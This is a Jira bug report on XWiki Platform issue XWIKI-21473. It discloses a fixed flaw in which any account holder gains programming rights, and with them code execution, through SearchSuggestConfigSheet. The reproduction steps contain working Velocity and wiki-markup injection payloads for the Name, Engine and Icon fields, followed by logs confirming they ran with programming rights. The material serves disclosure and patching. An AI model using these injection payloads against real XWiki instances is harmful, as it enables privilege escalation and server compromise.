

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21473)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21473)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-21473](/browse/XWIKI-21473)

# Remote code execution from account via SearchSuggestConfigSheet

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-21473 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.") Blocker
* **Fix Version/s:**
  [15.10.2](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.10.2 "15.10.2 "), [15.5.5](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+15.5.5 "15.5.5 "), [14.10.21](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.10.21 "14.10.21 ")
* **Affects Version/s:**
  9.2-rc-1
* **Component/s:**
  [Search - Generic](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+%22Search+-+Generic%22 "Search - Generic ")
* **Labels:**
  + [attack\_escalation](/issues/?jql=labels+%3D+attack_escalation "attack_escalation")
  + [attacker\_account](/issues/?jql=labels+%3D+attacker_account "attacker_account")
  + [security](/issues/?jql=labels+%3D+security "security")

* **Tests:**
  Unit
* **Difficulty:**
  Unknown
* **Documentation:**
  N/A
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**Steps to reproduce:**

1. Edit your user profile or any other page with the object editor.
2. Add an object of type "Search Suggest Configuration"
3. Add an object of type "SearchSuggestSourceClass" and set the following values:

   Name: $services.logging.getLogger("attacker").error("Hello from Name! I got programming: $services.security.authorization.hasAccess('programming')")

   Engine:
   ```
   {{/html}}{{async}}{{velocity}}$services.logging.getLogger("attacker").error("Hello from Engine! I got programming: $services.security.authorization.hasAccess('programming')"){{/velocity}}{{/async}}
   ```

   Icon: $services.logging.getLogger("attacker").error("Hello from Icon! I got programming: $services.security.authorization.hasAccess('programming')")
4. Save and view the page you've edited.

**Expected result:**

No error log messages appear, the search suggest source is normally displayed.

**Actual result:**

The display is broken and the following log messages appear in XWiki's log:

```
2023-10-26 11:57:18,175 [qtp2134607032-13310 - http://localhost:1509/xwiki/bin/view/XWiki/username] ERROR attacker                       - Hello from Icon! I got programming: true
2023-10-26 11:57:18,176 [qtp2134607032-13310 - http://localhost:1509/xwiki/bin/view/XWiki/username] ERROR attacker                       - Hello from Name! I got programming: true
2023-10-26 11:57:18,192 [org.xwiki.rendering.async.internal.AsyncRendererJob@1f5f517c([async, macro, xwiki:XWiki.SearchSuggestConfigSheet, 9, author, xwiki:XWiki.superadmin, rendering.restricted, false, secureDocument, xwiki:XWiki.SearchSuggestConfigSheet, 401])] ERROR attacker                       - Hello from Engine! I got programming: true
2023-10-26 11:57:18,192 [org.xwiki.rendering.async.internal.AsyncRendererJob@419b3704([async, macro, xwiki:XWiki.SearchSuggestConfigSheet, 25, author, xwiki:XWiki.superadmin, rendering.restricted, false, secureDocument, xwiki:XWiki.SearchSuggestConfigSheet, 402])] ERROR attacker                       - Hello from Engine! I got programming: true
2023-10-26 11:57:18,192 [org.xwiki.rendering.async.internal.AsyncRendererJob@49416ca0([async, macro, xwiki:XWiki.SearchSuggestConfigSheet, 50, author, xwiki:XWiki.superadmin, rendering.restricted, false, secureDocument, xwiki:XWiki.SearchSuggestConfigSheet, 403])] ERROR attacker                       - Hello from Engine! I got programming: true
2023-10-26 11:57:18,192 [org.xwiki.rendering.async.internal.AsyncRendererJob@4709f6cc([async, macro, xwiki:XWiki.SearchSuggestConfigSheet, 105, author, xwiki:XWiki.superadmin, rendering.restricted, false, secureDocument, xwiki:XWiki.SearchSuggestConfigSheet, 404])] ERROR attacker                       - Hello from Engine! I got programming: true

```

[![](https://jira.xwiki.org/secure/thumbnail/41838/_thumb_41838.png)](/secure/attachment/41838/41838_image-2023-10-26-11-58-02-390.png "image-2023-10-26-11-58-02-390.png")

This demonstrates an escalation from a simple account to programming rights. This code exists at least since [~~XWIKI-14100~~](https://jira.xwiki.org/browse/XWIKI-14100 "Improve the Wiki Administration") but might have existed before in another form.

The vulnerable code is in [SearchSuggestConfigSheet](https://github.com/xwiki/xwiki-platform/blob/d11ca5d781f8a42a85bc98eb82306c1431e764d4/xwiki-platform-core/xwiki-platform-search/xwiki-platform-search-ui/src/main/resources/XWiki/SearchSuggestConfigSheet.xml#L52).

#### Attachments

#### Attachments

* Options
  + [Sort By Name](/browse/XWIKI-21473?attachmentSortBy=fileName#attachmentmodule "viewissue.subtasks.tab.show.all.name")
  + [Sort By Date](/browse/XWIKI-21473?attachmentSortBy=dateTime#attachmentmodule "Sort By Date")
  + [Ascending](/browse/XWIKI-21473?attachmentOrder=asc#attachmentmodule "Ascending")
  + [Descending](/browse/XWIKI-21473?attachmentOrder=desc#attachmentmodule "Descending")
  + [Thumbnails](/browse/XWIKI-21473?attachmentViewMode=gallery#attachmentmodule "Thumbnails")
  + [List](/browse/XWIKI-21473?attachmentViewMode=list#attachmentmodule "List")
  + [Download All](/secure/attachmentzip/72329.zip "Download all attachments as a ZIP file")

1. [![image-2023-10-26-11-58-02-390.png](https://jira.xwiki.org/secure/thumbnail/41838/_thumb_41838.png)](/secure/attachment/41838/image-2023-10-26-11-58-02-390.png "image-2023-10-26-11-58-02-390.png - Latest 26/Oct/23 11:58 - Michael Hamann")[image-2023-10-26-11-58-02-390.png](/secure/attachment/41838/image-2023-10-26-11-58-02-390.png "image-2023-10-26-11-58-02-390.png - Latest 26/Oct/23 11:58 - Michael Hamann")286 kB26/Oct/23 11:58
#### Issue Links

depends on

![New Feature - A new feature of the product, which has yet to be developed.](/secure/viewavatar?size=xsmall&avatarId=13511&avatarType=issuetype "New Feature - A new feature of the product, which has yet to be developed.")
[XWIKI-21699](/browse/XWIKI-21699)
Add new API to help evaluate xobjects

* ![Major - Major loss of function.](/images/icons/priorities/major.svg "Major - Major loss of function.")
* Closed

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[Security Advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-h63h-5c77-77p5)

#### Activity

#### People

Assignee:

![pjeanjean](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Pierre Jeanjean

Reporter:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

#### Dates

Created:

26/Oct/23 11:59

Updated:

17/Jun/24 12:35

Resolved:

18/Dec/23 10:45

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

